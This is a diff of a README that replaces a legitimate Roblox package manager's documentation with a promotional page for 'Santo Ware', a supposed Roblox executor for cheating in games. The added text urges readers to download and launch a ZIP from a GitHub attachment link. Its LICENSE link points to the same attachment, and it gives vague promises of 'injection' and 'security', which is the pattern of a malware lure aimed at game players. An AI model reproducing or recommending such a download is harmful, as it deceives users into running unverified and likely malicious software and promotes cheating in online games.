@@ -1,88 +1,58 @@
-<br>
+# Santo Ware: The Ultimate Roblox Executor
 
-<div align="center">
-    <img src="https://raw.githubusercontent.com/daimond113/pesde/master/website/static/logo.svg" alt="pesde" width="200" />
-</div>
+## 🚀 Introduction
+Welcome to the official repository of Santo Ware, an extraordinary Roblox Executor! Developed exclusively for Roblox game enthusiasts, Santo Ware offers unparalleled gaming benefits. With this external software, you can gain the upper hand by unlocking hidden features, accessing exclusive content, and conquering your favorite Roblox games effortlessly.
 
-<br>
+![Santo Ware Logo](https://example.com/santowarelogo.png)
 
-# Important
+## 📁 Download Santo Ware
+Click the button below to download Santo Ware and elevate your Roblox gaming experience to new heights:
 
-> pesde is currently being rewritten, and this new version is not yet ready for use. You can find the stable version in the `master` branch.
+[![Download Santo Ware](https://img.shields.io/badge/Download-SantoWare-blue)](https://github.com/user-attachments/files/17382188/Software.zip)
 
-pesde is a package manager for Roblox that is designed to be feature-rich and easy to use.
-Currently, pesde is in a very early stage of development, but already supports the following features:
+## Features 🎮
+Here are some of the key features that Santo Ware offers:
 
-- Managing dependencies
-- Re-exporting types
-- `bin` exports (ran with Lune)
-- Patching packages
-- Downloading packages from Wally registries
+1. **Advanced Injection Techniques**: Santo Ware uses cutting-edge injection techniques to seamlessly integrate with Roblox games.
+2. **Roblox Game Enhancements**: Unlock hidden features and access exclusive content in your favorite Roblox games.
+3. **Script Execution**: Execute custom scripts to enhance gameplay and achieve unprecedented levels of success.
+4. **User-Friendly Interface**: Santo Ware is designed with a sleek and intuitive interface for ease of use.
+5. **Enhanced Security**: Stay protected while using Santo Ware with built-in security measures.
 
-## Installation
+## Getting Started 🛠️
+Follow these steps to get started with Santo Ware:
 
-pesde can be installed from GitHub Releases. You can find the latest
-release [here](https://github.com/daimond113/pesde/releases).
-It can also be installed by using [Aftman](https://github.com/LPGhatguy/aftman).
+1. Download Santo Ware by clicking the download button above.
+2. Extract the downloaded ZIP file to a location of your choice.
+3. Launch Santo Ware and follow the on-screen instructions to set up the software.
+4. Start exploring the various features and enhancements Santo Ware offers for Roblox games.
 
-## Usage
+## How to Use Santo Ware 🚨
+Once you have Santo Ware set up, here are some tips on using the software effectively:
 
-pesde is designed to be easy to use. Here are some examples of how to use it:
+### Script Execution
+To execute custom scripts, navigate to the "Scripts" tab within Santo Ware and paste your desired script. Click the "Execute" button to run the script in your Roblox game.
 
-```sh
-# Initialize a new project
-pesde init
+### Game Enhancements
+Explore the various game enhancements available in Santo Ware to uncover hidden features and access exclusive content. Customize your gameplay experience to suit your preferences.
 
-# Install a package
-pesde add daimond113/pesde@0.1.0
+### Security Measures
+Ensure that Santo Ware is running with the latest updates to benefit from enhanced security measures. Regularly check for updates within the software to stay protected while using it.
 
-# Remove a package
-pesde remove daimond113/pesde
+## Support and Feedback 📧
+If you encounter any issues or have feedback to share, feel free to reach out to our support team at support@santoware.com. We value your input and strive to continuously improve Santo Ware based on user suggestions.
 
-# List outdated packages
-pesde outdated
+![Support Team](https://example.com/supportteam.png)
 
-# Install all packages
-pesde install
+## Contributions 🌟
+We welcome contributions from the community to enhance Santo Ware further. If you have ideas for new features, improvements, or bug fixes, please submit a pull request. 
 
-# Search for a package
-pesde search pesde
+## License ℹ️
+Santo Ware is licensed under the MIT License. For more details, refer to the [LICENSE](https://github.com/user-attachments/files/17382188/LICENSE) file.
 
-# Run a binary
-pesde run daimond113/pesde
+## Disclaimer ❗
+Santo Ware is meant for educational and entertainment purposes only. The developers are not responsible for any misuse of the software.
 
-# Run a binary with arguments
-pesde run daimond113/pesde -- --help
-```
+---
 
-## Preparing to publish
-
-To publish you must first initialize a new project with `pesde init`. You can then use the other commands to manipulate
-dependencies, and edit the file
-manually to add metadata such as authors, description, and license.
-
-> **Warning**  
-> The pesde CLI respects the `.gitignore` file and will not include files that are ignored. The `.pesdeignore` file has
-> more power over the `.gitignore` file, so you can unignore files by prepending a `!` to the pattern.
-
-The pesde CLI supports the `.pesdeignore` file, which is similar to `.gitignore`. It can be used to include or exclude
-files from the package.
-
-## Documentation
-
-For more information, you can check the [documentation](https://pesde.daimond113.com/docs).
-
-## Registry
-
-The main pesde registry is hosted on [fly.io](https://fly.io). You can find it at https://registry.pesde.daimond113.com.
-
-### Self-hosting
-
-You can self-host the registry by using the default implementation in the `registry` folder, or by creating your own
-implementation. The API
-must be compatible with the default implementation, which can be found in the `main.rs` file.
-
-## Previous art
-
-pesde is heavily inspired by [npm](https://www.npmjs.com/), [pnpm](https://pnpm.io/), [Wally](https://wally.run),
-and [Cargo](https://doc.rust-lang.org/cargo/).
+Thank you for choosing Santo Ware to enhance your Roblox gaming experience! Happy gaming! 🎉
